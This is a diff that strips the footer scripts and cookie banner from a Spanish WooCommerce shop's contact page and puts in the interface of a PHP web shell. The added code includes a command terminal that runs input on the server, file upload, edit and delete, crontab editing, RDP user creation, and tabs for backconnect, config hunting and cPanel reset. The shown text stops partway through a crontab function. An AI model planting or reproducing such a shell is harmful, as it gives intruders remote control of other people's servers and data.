-var basel_page_css = {"basel-wp-gutenberg-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/wp-gutenberg.min.css","basel-opt-lazy-loading-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/opt-lazy-loading.min.css","basel-int-wpcf7-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/int-wpcf7.min.css","basel-woo-base-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/woo-base.min.css","basel-header-top-bar-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/header-top-bar.min.css","basel-header-general-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/header-general.min.css","basel-page-title-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/page-title.min.css","basel-footer-general-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/footer-general.min.css","basel-lib-photoswipe-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/lib-photoswipe.min.css","basel-opt-scrolltotop-css":"https:\/\/bolsomadrid.com\/wp-content\/themes\/basel\/css\/parts\/opt-scrolltotop.min.css"};
-var basel_variation_gallery_data = [];
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/functions.min.js?ver=5.9.0" id="basel-functions-js"></script>
-<script type="text/javascript" id="wc-cart-fragments-js-extra">
-/* <![CDATA[ */
-var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_baa731dbeb9fc047183e65e1eed18a36","fragment_name":"wc_fragments_baa731dbeb9fc047183e65e1eed18a36","request_timeout":"5000"};
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=10.1.1" id="wc-cart-fragments-js" defer="defer" data-wp-strategy="defer"></script>
-<script type="text/javascript" id="gt_widget_script_86743633-js-before">
-/* <![CDATA[ */
-window.gtranslateSettings = /* document.write */ window.gtranslateSettings || {};window.gtranslateSettings['86743633'] = {"default_language":"es","languages":["es","en","zh-CN","fr","pt","ar"],"url_structure":"none","native_language_names":1,"detect_browser_language":1,"flag_style":"3d","flag_size":24,"wrapper_selector":"#gt-wrapper-86743633","alt_flags":[],"horizontal_position":"inline","flags_location":"\/wp-content\/plugins\/gtranslate\/flags\/"};
-/* ]]> */
-</script><script src="https://bolsomadrid.com/wp-content/plugins/gtranslate/js/fn.js?ver=6.8.2" data-no-optimize="1" data-no-minify="1" data-gt-orig-url="/contacto" data-gt-orig-domain="bolsomadrid.com" data-gt-widget-id="86743633" defer></script><script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/photoswipe.min.js?ver=5.9.0" id="basel-photoswipe-js"></script>
-<script type="text/javascript" src="https://bolsomadrid.com/wp-content/themes/basel/js/photoswipe-ui-default.min.js?ver=5.9.0" id="basel-photoswipe-ui-default-js"></script>
-                <script>
-                    jQuery(document).ready(function($) {
-                        var wt_related_products = jQuery('.wt-related-products .owl-carousel');
+<!-- Context Menu -->
+<div class="context-menu" id="contextMenu">
+    <div class="context-menu-item" onclick="contextMenuAction('select')">
+        <i class="fas fa-check"></i> Select
+    </div>
+    <div class="context-menu-item" onclick="contextMenuAction('download')">
+        <i class="fas fa-download"></i> Download
+    </div>
+    <div class="context-menu-item" onclick="contextMenuAction('edit')">
+        <i class="fas fa-edit"></i> Edit
+    </div>
+    <div class="context-menu-item" onclick="contextMenuAction('rename')">
+        <i class="fas fa-i-cursor"></i> Rename
+    </div>
+    <div class="context-menu-item" onclick="contextMenuAction('chmod')">
+        <i class="fas fa-key"></i> Permissions
+    </div>
+    <div class="context-menu-item danger" onclick="contextMenuAction('delete')">
+        <i class="fas fa-trash"></i> Delete
+    </div>
+</div>
 
-                                                    if ("function" === typeof wt_related_products.owlCarousel) {
-                                wt_related_products.owlCarousel({
-                                    loop: false,
-                                    margin: 10,
-                                    nav: true,
-                                    navText: [
-                                        "<i class='dashicons dashicons-arrow-left-alt2 wt-left'></i>",
-                                        "<i class='dashicons dashicons-arrow-right-alt2 wt-right'></i>"
-                                    ],
-                                    //autoplay: true,
-                                    autoplayHoverPause: true,
-                                    responsive: {
-                                        0: {
-                                            items: 2                                        },
-                                        600: {
-                                            items: 2                                        },
-                                        1000: {
-                                            items: 3                                        }
-                                    }
-                                });
-                            }
-                        
-                        jQuery(".wt-related-products>.carousel-wrap>.owl-carousel>.owl-stage-outer>.owl-stage>.owl-item>div[class*='col-']").removeClass (function (index, css) {
-                            return (css.match (/(^|\s)col-\S+/g) || []).join(' ');
-                        });
-                     
-                                                /* Theme compatability for hover effect*/
-                                                                    });
-                                                                                       
-                </script>
-                <style>
-                    .wt-related-products{
-                        max-width: 98% !important;
+<!-- Modals -->
+<div id="uploadModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-upload"></i> Upload File</h3>
+        <form method="post" enctype="multipart/form-data">
+            <input type="hidden" name="action" value="upload">
+            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
+            <input type="file" name="file" style="margin: 15px 0;">
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button type="submit" class="btn btn-success">
+                    <i class="fas fa-upload"></i> Upload File
+                </button>
+                <button type="button" class="btn btn-danger" onclick="closeModal('uploadModal')">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="mkdirModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-folder-plus"></i> Create New Folder</h3>
+        <form method="post">
+            <input type="hidden" name="action" value="mkdir">
+            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
+            <input type="text" name="dirname" placeholder="Enter folder name" required style="margin: 10px 0;">
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button type="submit" class="btn btn-success">
+                    <i class="fas fa-plus"></i> Create Folder
+                </button>
+                <button type="button" class="btn btn-danger" onclick="closeModal('mkdirModal')">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="newfileModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-file-plus"></i> Create New File</h3>
+        <form method="post">
+            <input type="hidden" name="action" value="newfile">
+            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
+            <input type="text" name="filename" placeholder="Enter file name (e.g., example.txt)" required style="margin: 10px 0;">
+            <textarea name="filecontent" placeholder="File content (optional)" style="height: 300px; margin: 10px 0; font-family: 'Roboto Mono', monospace;"></textarea>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button type="submit" class="btn btn-success">
+                    <i class="fas fa-plus"></i> Create File
+                </button>
+                <button type="button" class="btn btn-danger" onclick="closeModal('newfileModal')">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="editModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;">Edit File: <span id="editFileName"></span></h3>
+        <form id="editForm">
+            <input type="hidden" name="filepath" id="editFilePath">
+            <textarea name="content" id="editFileContent" style="width:100%; height:60vh; border:1px solid #ced4da; padding:15px; font-family: 'Roboto Mono', monospace; background: #ffffff; color: #000000; font-size: 13px;"></textarea>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button type="button" class="btn btn-success" onclick="saveFile()">Save Changes</button>
+                <button type="button" class="btn btn-danger" onclick="closeModal('editModal')">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Zip Files Modal -->
+<div id="zipModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-file-archive"></i> Create Zip Archive</h3>
+        <div id="zipSelectedFiles" style="background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 15px; max-height: 150px; overflow-y: auto;"></div>
+        <input type="text" id="zipName" placeholder="Archive name (e.g., backup.zip)" value="archive_<?php echo date('Y-m-d'); ?>.zip" style="margin: 10px 0;">
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button type="button" class="btn btn-success" onclick="createZip()">
+                <i class="fas fa-file-archive"></i> Create Zip
+            </button>
+            <button type="button" class="btn btn-danger" onclick="closeModal('zipModal')">
+                <i class="fas fa-times"></i> Cancel
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Unzip File Modal -->
+<div id="unzipModal" class="modal">
+    <div class="modal-content">
+        <h3 style="margin-bottom: 20px;"><i class="fas fa-expand-arrows-alt"></i> Extract Zip File</h3>
+        <select id="unzipFileSelect" style="margin: 10px 0;">
+            <option value="">-- Select zip file --</option>
+            <?php
+            $files = @scandir($current_dir);
+            if ($files) {
+                foreach ($files as $file) {
+                    if ($file == '.' || $file == '..') continue;
+                    $fullpath = $current_dir . '/' . $file;
+                    if (!is_dir($fullpath) && preg_match('/\.(zip|tar|gz|rar)$/i', $file)) {
+                        echo '<option value="'.htmlspecialchars($fullpath).'">'.htmlspecialchars($file).'</option>';
                     }
-                    .wt-related-products .owl-carousel .owl-nav .owl-next:before ,.wt-related-products .owl-carousel .owl-nav .owl-prev:before {
-                        content: unset;
-                    }
-                                                                
-                                        .wt-related-products div.wt-crp-content-wrapper span.wt_price, .wt_cart_button {
-                                            display          : block;
-                                            text-align       : center;
-                                        }
+                }
+            }
+            ?>
+        </select>
+        <input type="text" id="unzipPath" placeholder="Extraction path (optional)" value="<?php echo htmlspecialchars($current_dir); ?>" style="margin: 10px 0;">
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button type="button" class="btn btn-success" onclick="extractZip()">
+                <i class="fas fa-expand-arrows-alt"></i> Extract
+            </button>
+            <button type="button" class="btn btn-danger" onclick="closeModal('unzipModal')">
+                <i class="fas fa-times"></i> Cancel
+            </button>
+        </div>
+    </div>
+</div>
 
-                                        .wt-related-products div.wt-crp-content-wrapper .wt-crp-product-title {
-                                            text-align     : center;
-                                            margin: 0px;
-                                        }
+<script>
+// Global variables
+let commandHistory = JSON.parse(localStorage.getItem('commandHistory') || '[]');
+let currentHistoryIndex = -1;
+let selectedFiles = new Set();
+let contextMenuTarget = null;
 
-                                        .wt-related-products .owl-theme .owl-nav [class*=owl-] {
-                                            color: #969292 ;
-                                            padding: 0px !important;
-                                            margin: 20px ;
-                                            height: 40px !important;
-                                            width: 40px !important;
-                                            border-radius: 50% !important;
-                                            z-index: 10000000;
-                                        }
-                                        /* .owl-theme .owl-nav [class*=owl-] {
-                                            background: #ffffff !important;
-                                        } */
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', function() {
+    loadCrontab();
+    updateCommandHistoryDisplay();
+    
+    // Focus terminal input when terminal tab is active
+    const terminalInput = document.getElementById('terminalInput');
+    if (terminalInput) {
+        terminalInput.focus();
+        
+        // Enter key to execute command
+        terminalInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeCommand();
+            }
+        });
+        
+        // Arrow up/down for command history
+        terminalInput.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                navigateHistory(-1);
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                navigateHistory(1);
+            }
+        });
+    }
 
-                                        /* fix blank or flashing items on carousel */
-                                        .wt-related-products .owl-carousel .item {
-                                            position: relative;
-                                            z-index: 100;
-                                            -webkit-backface-visibility: hidden;
-                                        }
+    // Context menu handling
+    document.addEventListener('contextmenu', function(e) {
+        if (e.target.closest('.file-item')) {
+            e.preventDefault();
+            showContextMenu(e);
+        }
+    });
 
-                                        /* end fix */
-                                        .wt-related-products .owl-nav > div {
-                                            margin-top: -26px;
-                                            position: absolute;
-                                            top: 30%;
-                                            color: #cdcbcd;
-                                        }
+    document.addEventListener('click', function() {
+        hideContextMenu();
+    });
 
-                                        .wt-related-products .owl-nav i {
-                                            font-size: 32px !important;
-                                            margin-top: 2px !important;
-                                            line-height: initial !important;
-                                        }
+    // File selection handling
+    document.addEventListener('click', function(e) {
+        if (e.target.closest('.file-item') && !e.target.closest('.file-actions')) {
+            const fileItem = e.target.closest('.file-item');
+            if (e.ctrlKey || e.metaKey) {
+                // Multi-select with Ctrl/Cmd
+                toggleFileSelection(fileItem);
+            } else if (e.shiftKey) {
+                // Range select with Shift
+                selectFileRange(fileItem);
+            } else {
+                // Single select
+                clearSelection();
+                toggleFileSelection(fileItem);
+            }
+            updateSelectionUI();
+        }
+    });
+});
 
-                                        .wt-related-products .owl-nav .owl-prev {
-                                            left: -11px;
-                                        }
+// Tab switching functions
+function showWpUser() { switchTab('wpUser'); }
+function showPortScanner() { switchTab('portScanner'); }
+function showWebshellScanner() { switchTab('webshellScanner'); }
+function showBackconnect() { switchTab('backconnect'); }
+function showConfigHunter() { switchTab('configHunter'); }
+function showCpanelReset() { switchTab('cpanelReset'); }
+function showCrontabManager() { switchTab('crontab'); }
+function showRdpManager() { switchTab('rdpManager'); }
 
-                                        .wt-related-products .owl-nav .owl-next {
-                                            right: -11px;
-                                        }
+function showUpload() {
+    document.getElementById('uploadModal').style.display = 'block';
+}
 
-                                        .wt-related-products .carousel-wrap {
-                                            padding: 0 3%;
-                                            position: relative;
-                                        }
-                                        .wt-related-products .carousel-wrap ul {
-                                          overflow: hidden;
-                                        }
+function showMkdir() {
+    document.getElementById('mkdirModal').style.display = 'block';
+}
 
-                                        .wt-related-products .wt-crp-content-wrapper .quantity{
-                                            display: none;
-                                        }
+function showNewFile() {
+    document.getElementById('newfileModal').style.display = 'block';
+}
 
-                                        .wt-related-products .wt-crp-content-wrapper .add_to_cart_button {
-                                            margin-bottom: 5px !important;
-                                        }
-                                        .wt-related-products .wt-crp-content-wrapper form.cart {
-                                            padding: 0px 0 !important;
-                                        }
-                                        /* Slider arrow image */
-                                        .wt-related-products .slider_arrow{
-                                            height: 100%;
-                                            width: 100%;
-                                            vertical-align: baseline;
-                                        }
-                                        .wt-related-products .wt-crp-content-wrapper{
-                                            line-height: 28px;
-                                            margin-top: 5px;
-                                        }
+function showZipFiles() {
+    if (selectedFiles.size === 0) return;
+    
+    const fileList = document.getElementById('zipSelectedFiles');
+    fileList.innerHTML = '<strong>Selected files:</strong><br>' + 
+        Array.from(selectedFiles).map(file => `• ${file}`).join('<br>');
+    
+    document.getElementById('zipModal').style.display = 'block';
+}
 
-                                        .wt-related-products .owl-theme .owl-nav [class*=owl-]:hover {
-                                            background:  #1f2021 !important;
-                                            text-decoration: none;
-                                        }
+function showUnzipFile() {
+    document.getElementById('unzipModal').style.display = 'block';
+}
 
-                                        .woocommerce-page .wt-related-products ul.products li.product, .wt-related-products ul.products li.product, .wt-related-products ul.products {
-                                            margin: initial !important;
-                                            width: initial !important;
-                                            float: initial !important;
-                                            grid-template-columns: initial !important;
-                                            max-width:initial !important;
-                                            min-width:initial !important;
-                                        }
-                                        .wt-related-products .woocommerce ul.products, .wt-related-products .woocommerce-page ul.products {
-                                            grid-template-columns: initial !important;
-                                        }
-                                        .wt-crp-wrapper div{
-                                            max-width: 100%;
+function closeModal(id) {
+    document.getElementById(id).style.display = 'none';
+}
 
-                                        }
-                                        .wt-related-products .owl-dots{
-                                            display: none !important;
-                                        }
-                                        .wt-related-products .owl-nav .dashicons {
-                                            width: 40px;
-                                            height: 40px;
-                                        }
+function switchTab(tabName) {
+    // Hide all tab contents
+    document.querySelectorAll('.tab-content').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    
+    // Remove active class from all tab buttons
+    document.querySelectorAll('.tab-button').forEach(button => {
+        button.classList.remove('active');
+    });
+    
+    // Show selected tab content
+    document.getElementById(tabName).classList.add('active');
+    
+    // Activate selected tab button
+    event.target.classList.add('active');
+    
+    // Focus terminal input when switching to terminal
+    if (tabName === 'terminal') {
+        setTimeout(() => {
+            document.getElementById('terminalInput').focus();
+        }, 100);
+    }
+}
 
-                                                                
-                </style>
-            <div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'></div>			<link rel="stylesheet" id="basel-opt-cookies-popup-css" href="https://bolsomadrid.com/wp-content/themes/basel/css/parts/opt-cookies-popup.min.css?ver=5.9.0" type="text/css" media="all" /> 						<div class="basel-cookies-popup">
-				<div class="basel-cookies-inner">
-					<div class="cookies-info-text">
-						Esta web (como todas) utiliza Cookies para mejorar tu experiencia. Puedes revisar tus preferencias de privacidad para revisar las cookies que utilizamos para mejorar tu experiencia.					</div>
-					<div class="cookies-buttons">
-						<a href="#" rel="nofollow" class="cookies-accept-btn">Accept</a>
-													<a href="https://bolsomadrid.com/politica-de-cookies" class="cookies-more-btn">More info</a>
-											</div>
-				</div>
-			</div>
-		
+// File Selection Functions
+function toggleFileSelection(fileItem) {
+    const fileName = fileItem.dataset.file;
+    if (selectedFiles.has(fileName)) {
+        selectedFiles.delete(fileName);
+        fileItem.classList.remove('selected');
+    } else {
+        selectedFiles.add(fileName);
+        fileItem.classList.add('selected');
+    }
+}
+
+function clearSelection() {
+    selectedFiles.clear();
+    document.querySelectorAll('.file-item.selected').forEach(item => {
+        item.classList.remove('selected');
+    });
+}
+
+function selectFileRange(targetItem) {
+    const fileItems = Array.from(document.querySelectorAll('.file-item'));
+    const targetIndex = fileItems.indexOf(targetItem);
+    
+    if (selectedFiles.size === 0) {
+        toggleFileSelection(targetItem);
+        return;
+    }
+    
+    // Find first selected item
+    let firstSelectedIndex = -1;
+    for (let i = 0; i < fileItems.length; i++) {
+        if (fileItems[i].classList.contains('selected')) {
+            firstSelectedIndex = i;
+            break;
+        }
+    }
+    
+    if (firstSelectedIndex === -1) return;
+    
+    // Select range
+    const start = Math.min(firstSelectedIndex, targetIndex);
+    const end = Math.max(firstSelectedIndex, targetIndex);
+    
+    for (let i = start; i <= end; i++) {
+        const fileName = fileItems[i].dataset.file;
+        selectedFiles.add(fileName);
+        fileItems[i].classList.add('selected');
+    }
+}
+
+function updateSelectionUI() {
+    const count = selectedFiles.size;
+    document.getElementById('selectedCount').textContent = count;
+    document.getElementById('zipBtn').disabled = count === 0;
+}
+
+// Context Menu Functions
+function showContextMenu(e) {
+    const contextMenu = document.getElementById('contextMenu');
+    contextMenuTarget = e.target.closest('.file-item');
+    
+    contextMenu.style.display = 'block';
+    contextMenu.style.left = e.pageX + 'px';
+    contextMenu.style.top = e.pageY + 'px';
+    
+    e.preventDefault();
+}
+
+function hideContextMenu() {
+    document.getElementById('contextMenu').style.display = 'none';
+    contextMenuTarget = null;
+}
+
+function contextMenuAction(action) {
+    if (!contextMenuTarget) return;
+    
+    const filePath = contextMenuTarget.dataset.path;
+    const fileName = contextMenuTarget.dataset.file;
+    const fileType = contextMenuTarget.dataset.type;
+    
+    switch (action) {
+        case 'select':
+            toggleFileSelection(contextMenuTarget);
+            updateSelectionUI();
+            break;
+        case 'download':
+            if (fileType !== 'dir') {
+                window.location.href = '?action=download&file=' + encodeURIComponent(filePath) + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
+            }
+            break;
+        case 'edit':
+            if (fileType !== 'dir') {
+                editFile(filePath);
+            }
+            break;
+        case 'rename':
+            renameFile(filePath);
+            break;
+        case 'chmod':
+            const currentPerm = contextMenuTarget.querySelector('.file-permission').textContent;
+            chmodFile(filePath, currentPerm);
+            break;
+        case 'delete':
+            deleteFile(filePath);
+            break;
+    }
+    
+    hideContextMenu();
+}
+
+// Zip/Unzip Functions
+function createZip() {
+    const zipName = document.getElementById('zipName').value;
+    if (!zipName) {
+        alert('Please enter a zip file name');
+        return;
+    }
+    
+    const files = Array.from(selectedFiles);
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=zip_files&files=${encodeURIComponent(JSON.stringify(files))}&zip_name=${encodeURIComponent(zipName)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('Zip file created successfully: ' + data.output);
+            closeModal('zipModal');
+            // Refresh page to show new zip file
+            setTimeout(() => {
+                window.location.reload();
+            }, 1000);
+        } else {
+            alert('Error creating zip: ' + data.output);
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error);
+    });
+}
+
+function extractZip() {
+    const zipFile = document.getElementById('unzipFileSelect').value;
+    const extractPath = document.getElementById('unzipPath').value;
+    
+    if (!zipFile) {
+        alert('Please select a zip file');
+        return;
+    }
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=unzip_file&zip_file=${encodeURIComponent(zipFile)}&extract_path=${encodeURIComponent(extractPath)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('Zip file extracted successfully: ' + data.output);
+            closeModal('unzipModal');
+            // Refresh page to show extracted files
+            setTimeout(() => {
+                window.location.reload();
+            }, 1000);
+        } else {
+            alert('Error extracting zip: ' + data.output);
+        }
+    })
+    .catch(error => {
+        alert('Error: ' + error);
+    });
+}
+
+// RDP Functions
+function addRdpUser() {
+    const username = document.getElementById('rdpUsername').value;
+    const password = document.getElementById('rdpPassword').value;
+    
+    if (!username || !password) {
+        alert('Please enter both username and password');
+        return;
+    }
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=add_rdp_user&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('rdpManagerOutput');
+        if (data.success) {
+            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        document.getElementById('rdpManagerOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+function enableRdp() {
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'ajax=true&action=enable_rdp'
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('rdpManagerOutput');
+        if (data.success) {
+            output.innerHTML = `<div style="color: #28a745;">${data.output}</div>`;
+        } else {
+            output.innerHTML = `<div style="color: #dc3545;">${data.output}</div>`;
+        }
+    })
+    .catch(error => {
+        document.getElementById('rdpManagerOutput').innerHTML = `<div style="color: #dc3545;">Error: ${error}</div>`;
+    });
+}
+
+// Terminal functions
+function executeCommand(cmd = null) {
+    const terminalInput = document.getElementById('terminalInput');
+    const executeBtn = document.getElementById('executeBtn');
+    const command = cmd || terminalInput.value.trim();
+    
+    if (!command) return;
+    
+    // Add to command history
+    if (!commandHistory.includes(command)) {
+        commandHistory.unshift(command);
+        if (commandHistory.length > 20) {
+            commandHistory.pop();
+        }
+        localStorage.setItem('commandHistory', JSON.stringify(commandHistory));
+        updateCommandHistoryDisplay();
+    }
+    
+    // Clear input and disable button
+    terminalInput.value = '';
+    executeBtn.disabled = true;
+    executeBtn.textContent = 'Executing...';
+    
+    // Show command in output
+    const terminalOutput = document.getElementById('terminalOutput');
+    terminalOutput.innerHTML += `<div class="terminal-prompt">$ ${command}</div>`;
+    terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    
+    // Execute command via AJAX
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=execute_command&command=${encodeURIComponent(command)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            terminalOutput.innerHTML += `<div class="terminal-output-line">${data.output}</div>`;
+        } else {
+            terminalOutput.innerHTML += `<div class="terminal-output-line" style="color: #dc3545;">Error: ${data.output}</div>`;
+        }
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    })
+    .catch(error => {
+        terminalOutput.innerHTML += `<div class="terminal-output-line" style="color: #dc3545;">Network error: ${error}</div>`;
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    })
+    .finally(() => {
+        // Re-enable button
+        executeBtn.disabled = false;
+        executeBtn.textContent = 'Execute';
+        terminalInput.focus();
+        currentHistoryIndex = -1;
+    });
+}
+
+function executeCommandWithDir(cmd) {
+    const currentDir = '<?php echo addslashes($current_dir); ?>';
+    const command = `cd "${currentDir}" && ${cmd}`;
+    executeCommand(command);
+}
+
+function insertCommonCommandWithDir(cmd) {
+    const terminalInput = document.getElementById('terminalInput');
+    terminalInput.value = cmd;
+    terminalInput.focus();
+}
+
+function clearTerminal() {
+    document.getElementById('terminalOutput').innerHTML = '<div>// Terminal cleared</div>';
+}
+
+function insertCommonCommand(cmd) {
+    const terminalInput = document.getElementById('terminalInput');
+    terminalInput.value = cmd;
+    terminalInput.focus();
+}
+
+function updateCommandHistoryDisplay() {
+    const historyContainer = document.getElementById('commandHistory');
+    if (historyContainer && commandHistory.length > 0) {
+        historyContainer.innerHTML = '<strong>Command History:</strong><br>' + 
+            commandHistory.slice(0, 5).map((cmd, index) => 
+                `<div class="command-item" onclick="insertCommonCommand('${cmd.replace(/'/g, "\\'")}')">${cmd}</div>`
+            ).join('');
+    }
+}
+
+function navigateHistory(direction) {
+    if (commandHistory.length === 0) return;
+    
+    const terminalInput = document.getElementById('terminalInput');
+    
+    if (currentHistoryIndex === -1) {
+        currentHistoryIndex = direction === -1 ? 0 : commandHistory.length - 1;
+    } else {
+        currentHistoryIndex += direction;
+        if (currentHistoryIndex < 0) currentHistoryIndex = commandHistory.length - 1;
+        if (currentHistoryIndex >= commandHistory.length) currentHistoryIndex = 0;
+    }
+    
+    terminalInput.value = commandHistory[currentHistoryIndex];
+}
+
+// File editor functions
+function editFile(filepath) {
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=get_file_content&filepath=${encodeURIComponent(filepath)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            document.getElementById('editFilePath').value = filepath;
+            document.getElementById('editFileName').textContent = filepath.split('/').pop();
+            document.getElementById('editFileContent').value = data.content;
+            document.getElementById('editModal').style.display = 'block';
+        } else {
+            alert('Error loading file: ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('Error loading file: ' + error);
+    });
+}
+
+function saveFile() {
+    const filepath = document.getElementById('editFilePath').value;
+    const content = document.getElementById('editFileContent').value;
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=save_file_content&filepath=${encodeURIComponent(filepath)}&content=${encodeURIComponent(content)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('File saved successfully!');
+            closeModal('editModal');
+            // Refresh the page to show updated file list
+            setTimeout(() => {
+                window.location.reload();
+            }, 500);
+        } else {
+            alert('Error saving file: ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('Error saving file: ' + error);
+    });
+}
+
+function chmodFile(filepath, currentPerm) {
+    var newPerm = prompt('Change permissions for:\n' + filepath + '\n\nCurrent: ' + currentPerm + '\nNew (e.g., 755):', currentPerm);
+    if (newPerm !== null && newPerm !== '') {
+        window.location.href = '?action=chmod&file=' + encodeURIComponent(filepath) + '&perm=' + newPerm + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
+    }
+}
+
+function renameFile(filepath) {
+    var newName = prompt('Rename file:\n' + filepath + '\n\nNew name:', filepath.split('/').pop());
+    if (newName !== null && newName !== '') {
+        var form = document.createElement('form');
+        form.method = 'post';
+        form.innerHTML = '<input type="hidden" name="action" value="rename">' +
+                         '<input type="hidden" name="oldname" value="' + filepath + '">' +
+                         '<input type="hidden" name="newname" value="' + filepath.replace(filepath.split('/').pop(), newName) + '">';
+        document.body.appendChild(form);
+        form.submit();
+    }
+}
+
+function deleteFile(filepath) {
+    if (confirm('Are you sure you want to delete:\n' + filepath + '?')) {
+        window.location.href = '?action=delete&file=' + encodeURIComponent(filepath) + '&dir=' + encodeURIComponent('<?php echo $current_dir; ?>');
+    }
+}
+
+// Crontab functions
+function loadCrontab() {
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'ajax=true&action=view_crontab'
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('crontabOutput');
+        const textarea = document.getElementById('crontabContent');
+        
+        if (data.success) {
+            output.textContent = data.output;
+            textarea.value = data.output;
+        } else {
+            output.textContent = data.output;
+            textarea.value = data.output;
+        }
+    })
+    .catch(error => {
+        document.getElementById('crontabOutput').textContent = 'Error loading crontab: ' + error;
+    });
+}
+
+function saveCrontab() {
+    const content = document.getElementById('crontabContent').value;
+    
+    if (!confirm('Are you sure you want to update crontab?')) {
+        return;
+    }
+    
+    fetch('', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `ajax=true&action=save_crontab&crontab_content=${encodeURIComponent(content)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        const output = document.getElementById('crontabOutput');
+        if (data.success) {
+            output.textContent = data.output;
+            alert('Crontab updated successfully!');
+        } else {
+            output.textContent = data.output;
+            alert('Error updating crontab!');
+        }
+    })
+    .catch(error => {
+        alert('Error saving crontab: ' + error);
+    });
+}
+
+function addCrontabExample() {
+    var example = "# Crontab Examples\n\n" +
+                 "# Run every minute\n" +
+                 "* * * * * /path/to/command\n\n" +
